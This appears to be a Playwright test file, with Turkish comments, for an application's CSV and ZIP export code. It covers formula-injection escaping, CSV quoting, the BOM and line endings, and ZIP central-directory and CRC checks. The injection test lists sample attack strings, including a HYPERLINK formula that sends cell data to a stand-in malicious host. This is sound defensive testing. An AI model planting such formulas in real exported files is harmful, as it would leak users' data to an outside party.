import { inflateRawSync } from "node:zlib";

import { expect, test } from "@playwright/test";

import { escapeFormulaInjection, toCsv, toCsvCell } from "../src/lib/export/csv";
import { buildZip, crc32 } from "../src/lib/export/zip";

/**
 * Dışa aktarma biçim katmanı (Issue #194) — CSV ve ZIP. DB'ye dokunmaz.
 */

/**
 * ZIP'i BAĞIMSIZ olarak ayrıştırır: merkezî dizini okur ve girdileri oradan çözer.
 *
 * NEDEN yerel başlıkları taramıyor: bir arşivin açılabilir olmasını belirleyen şey merkezî
 * dizindir. Yalnızca yerel başlıkları okuyan bir doğrulayıcı, merkezî dizini bozuk bir
 * arşivi "geçti" derdi — bu tam olarak geliştirme sırasında yaşandı ve .NET `ZipFile`
 * arşivi 0 girdi olarak gördü.
 */
function readZipCentralDirectory(zip: Buffer): Array<{ name: string; content: Buffer }> {
  const eocdSignature = 0x06054b50;
  let eocd = -1;

  for (let index = zip.length - 22; index >= 0; index -= 1) {
    if (zip.readUInt32LE(index) === eocdSignature) {
      eocd = index;
      break;
    }
  }

  if (eocd === -1) {
    throw new Error("End of central directory bulunamadi");
  }

  const entryCount = zip.readUInt16LE(eocd + 10);
  let pointer = zip.readUInt32LE(eocd + 16);
  const entries: Array<{ name: string; content: Buffer }> = [];

  for (let index = 0; index < entryCount; index += 1) {
    if (zip.readUInt32LE(pointer) !== 0x02014b50) {
      throw new Error(`Merkezi dizin girdisi ${index} bozuk`);
    }

    const compressedSize = zip.readUInt32LE(pointer + 20);
    const uncompressedSize = zip.readUInt32LE(pointer + 24);
    const nameLength = zip.readUInt16LE(pointer + 28);
    const extraLength = zip.readUInt16LE(pointer + 30);
    const commentLength = zip.readUInt16LE(pointer + 32);
    const localOffset = zip.readUInt32LE(pointer + 42);
    const name = zip.toString("utf8", pointer + 46, pointer + 46 + nameLength);

    const localNameLength = zip.readUInt16LE(localOffset + 26);
    const localExtraLength = zip.readUInt16LE(localOffset + 28);
    const dataStart = localOffset + 30 + localNameLength + localExtraLength;
    const content = inflateRawSync(zip.subarray(dataStart, dataStart + compressedSize));

    expect(content.length, `${name} boyutu basliktakiyle uyusmuyor`).toBe(uncompressedSize);
    expect(crc32(content), `${name} CRC uyusmuyor`).toBe(zip.readUInt32LE(pointer + 16));

    entries.push({ name, content });
    pointer += 46 + nameLength + extraLength + commentLength;
  }

  return entries;
}

test.describe("CSV formül enjeksiyonu", () => {
  test("tehlikeli ön ekler tek tırnakla etkisizleştiriliyor", () => {
    // Excel bu hücreleri FORMÜL olarak çalıştırır. Kullanıcının verdiği bir kategori adı,
    // dışa aktarmayı açan kişinin makinesinde çalışan koda dönüşmemelidir.
    const attacks = [
      '=HYPERLINK("http://kotu.site?d="&A1,"Tikla")',
      "+1+1",
      "-2+3",
      "@SUM(A1:A9)",
      "\tsekme",
      "\rsatirbasi",
    ];

    for (const attack of attacks) {
      expect(escapeFormulaInjection(attack), attack).toBe(`'${attack}`);
    }
  });

  test("KONTROL GRUBU: zararsız değerler DEĞİŞTİRİLMİYOR", () => {
    // Duyarlılık kanıtı: her değere tırnak ekleyen bir implementasyon yukarıdaki testi de
    // geçerdi ama tüm veriyi bozardı.
    for (const safe of ["Kirtasiye", "1234", "a=b", "TL 500", "", "müşteri (A)"]) {
      expect(escapeFormulaInjection(safe), safe).toBe(safe);
    }
  });

  test("kaçırma, alıntılamadan ÖNCE yapılıyor", () => {
    // Ters sıra, eklenen tırnağı alıntı işaretinin dışında bırakır ve ayrıştırmayı bozardı.
    expect(toCsvCell('=1,2')).toBe(`"'=1,2"`);
  });
});

test.describe("CSV biçimi (RFC 4180)", () => {
  test("virgül, tırnak ve satır sonu içeren hücreler alıntılanıyor", () => {
    expect(toCsvCell("a,b")).toBe('"a,b"');
    expect(toCsvCell('de"dim')).toBe('"de""dim"');
    expect(toCsvCell("iki\nsatir")).toBe('"iki\nsatir"');
  });

  test("null ve undefined BOŞ hücre, 'null' metni değil", () => {
    // Dışa aktarılan veri başka bir sisteme girdi olur; "null" orada bir dize değeri olurdu.
    expect(toCsvCell(null)).toBe("");
    expect(toCsvCell(undefined)).toBe("");
  });

  test("tarihler ISO 8601 olarak yazılıyor", () => {
    expect(toCsvCell(new Date("2026-09-04T10:20:30.000Z"))).toBe("2026-09-04T10:20:30.000Z");
  });

  test("çıktı BOM ile başlıyor ve CRLF kullanıyor", () => {
    // BOM olmadan Excel UTF-8'i sistem kod sayfasıyla açar ve Türkçe karakterler bozulur.
    const csv = toCsv([{ ad: "Kırtasiye" }], [{ header: "ad", value: (row) => row.ad }]);

    expect(csv.startsWith("﻿")).toBe(true);
    expect(csv).toContain("\r\n");
    expect(csv).toBe("﻿ad\r\nKırtasiye\r\n");
  });

  test("boş satır listesinde yalnızca başlık üretiliyor", () => {
    const csv = toCsv([] as Array<{ ad: string }>, [{ header: "ad", value: (row) => row.ad }]);
    expect(csv).toBe("﻿ad\r\n");
  });
});

test.describe("ZIP yazıcı", () => {
  test("merkezî dizinden okunabiliyor ve içerik bozulmadan geri geliyor", () => {
    const entries = [
      { name: "manifest.json", content: Buffer.from('{"version":1}', "utf8") },
      { name: "hesaplar.csv", content: Buffer.from("﻿id,ad\r\n1,Kırtasiye\r\n", "utf8") },
      { name: "büyük.csv", content: Buffer.from("x".repeat(200_000), "utf8") },
    ];

    const parsed = readZipCentralDirectory(buildZip(entries));

    expect(parsed.map((entry) => entry.name)).toEqual([
      "manifest.json",
      "hesaplar.csv",
      "büyük.csv",
    ]);

    for (const [index, entry] of entries.entries()) {
      expect(parsed[index].content.equals(entry.content), entry.name).toBe(true);
    }
  });

  test("gerçekten sıkıştırıyor", () => {
    // Sıkıştırma yapmayan (stored) bir implementasyon da yukarıdaki testi geçerdi.
    const content = Buffer.from("x".repeat(200_000), "utf8");
    expect(buildZip([{ name: "a.csv", content }]).length).toBeLessThan(1_000);
  });

  test("boş dosya ve boş arşiv üretilebiliyor", () => {
    expect(readZipCentralDirectory(buildZip([{ name: "bos.csv", content: Buffer.alloc(0) }]))).toEqual([
      { name: "bos.csv", content: Buffer.alloc(0) },
    ]);
    expect(readZipCentralDirectory(buildZip([]))).toEqual([]);
  });

  test("aynı ad iki kez verilirse FIRLATIYOR", () => {
    // ZIP bunu teknik olarak kabul eder ama açan araçlar birini sessizce ezer — dışa
    // aktarmada bu, bir tablonun kaybolması demektir.
    expect(() =>
      buildZip([
        { name: "a.csv", content: Buffer.from("1") },
        { name: "a.csv", content: Buffer.from("2") },
      ]),
    ).toThrow(/Duplicate/);
  });

  test("CRC-32 bilinen vektörle doğrulanıyor", () => {
    // Kendi tablomuzun doğruluğu dışarıdan bilinen bir değerle kanıtlanır.
    expect(crc32(Buffer.from("123456789", "utf8"))).toBe(0xcbf43926);
    expect(crc32(Buffer.alloc(0))).toBe(0);
  });

  test("dosya adları UTF-8 bayrağıyla yazılıyor", () => {
    // Bayrak olmadan Türkçe adlar bazı araçlarda bozulur.
    const zip = buildZip([{ name: "büyük.csv", content: Buffer.from("x") }]);

    expect(zip.readUInt16LE(6) & 0x0800, "yerel baslikta UTF-8 bayragi yok").toBe(0x0800);
  });
});
